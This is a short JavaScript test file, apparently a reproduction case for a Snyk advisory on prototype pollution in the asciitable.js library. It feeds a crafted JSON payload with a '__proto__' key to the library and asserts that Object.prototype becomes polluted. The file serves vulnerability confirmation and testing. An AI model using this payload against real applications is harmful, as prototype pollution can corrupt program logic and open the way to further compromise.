//https://snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799
test("Prototype pollution in asciitable.js", () => {
  expect({}.polluted).toBe(undefined);

  const req = require("asciitable.js");
  const b = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  req({}, b);

  expect({}.polluted).toBe("yes");
});
